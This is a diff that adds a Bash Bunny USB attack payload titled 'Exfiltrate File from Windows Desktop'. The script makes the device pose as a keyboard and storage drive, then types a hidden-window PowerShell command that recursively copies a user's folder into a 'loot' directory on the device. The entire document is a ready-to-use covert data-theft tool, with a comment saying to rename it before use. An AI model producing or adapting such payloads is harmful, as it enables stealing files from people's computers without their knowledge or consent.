@@ -1,0 +1,20 @@
+#!/bin/bash
+# please change name to payload.txt before use and adjust paths
+# Title: Exfiltrate File from Windows Desktop
+# Target: Windows
+# Description: Copies a specific file to Bash Bunny storage using PowerShell.
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+# Wait for system to initialize USB device
+sleep 10
+
+# PowerShell payload to copy the file to Bash Bunny drive
+QUACK GUI r
+QUACK DELAY 900
+QUACK STRING powershell -WindowStyle Hidden -Command "Start-Sleep -s 2; \$src='C:\\Users\\test'; \$dst='E:\\loot\\test'; Copy-Item -Path \$src\\* -Destination \$dst -Recurse -Force"
+QUACK DELAY 500
+QUACK ENTER
+
+LED FINISH
